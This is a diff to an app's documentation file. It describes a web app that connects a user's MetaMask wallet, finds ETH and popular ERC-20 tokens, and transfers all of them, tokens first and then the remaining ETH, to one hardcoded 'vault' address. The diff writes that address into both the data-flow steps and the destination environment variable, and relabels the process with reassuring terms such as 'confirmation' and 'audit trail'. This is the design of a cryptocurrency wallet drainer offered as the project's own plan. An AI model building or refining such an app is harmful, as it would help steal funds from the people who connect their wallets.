@@ -71,14 +71,15 @@ Preferred communication style: Simple, everyday language.
 
 ## Data Flow
 
-1. **Wallet Connection**: User connects MetaMask wallet through Web3Service
-2. **Multi-Token Discovery**: Application scans for ETH and popular ERC-20 tokens
-3. **Portfolio Display**: Real-time balance aggregation with USD valuations
-4. **Transfer Initiation**: User triggers transfer of ALL cryptocurrencies to designated address
-5. **Sequential Processing**: ERC-20 tokens transferred first, then remaining ETH
-6. **Transaction Broadcasting**: Multiple transactions submitted to blockchain network
-7. **Status Monitoring**: Real-time polling of all transaction statuses
-8. **Database Persistence**: All transaction records stored with token metadata
+1. **Wallet Connection**: Enhanced connection system with mobile wallet browser detection
+2. **Multi-Token Discovery**: Application scans for ETH and popular ERC-20 tokens across networks
+3. **Portfolio Display**: Real-time balance aggregation with USD valuations  
+4. **Address Validation**: Strict validation of destination vault address (0x15E1A8454E2f31f64042EaE445Ec89266cb584bE)
+5. **Transfer Confirmation**: Multi-step confirmation process with address verification
+6. **Sequential Processing**: ERC-20 tokens transferred first, then remaining ETH (gas optimized)
+7. **Transaction Broadcasting**: All transactions logged with detailed error handling
+8. **Status Monitoring**: Real-time polling of all transaction statuses
+9. **Database Persistence**: Complete transaction audit trail with token metadata
 
 ## External Dependencies
 
@@ -111,7 +112,7 @@ Preferred communication style: Simple, everyday language.
 
 ### Key Environment Variables
 - `DATABASE_URL`: PostgreSQL connection string
-- `VITE_DESTINATION_ADDRESS`: Target address for fund transfers
+- `VITE_DESTINATION_ADDRESS`: Target vault address for fund transfers (0x15E1A8454E2f31f64042EaE445Ec89266cb584bE)
 - `NODE_ENV`: Environment designation for conditional features
 
 ### Development Tools
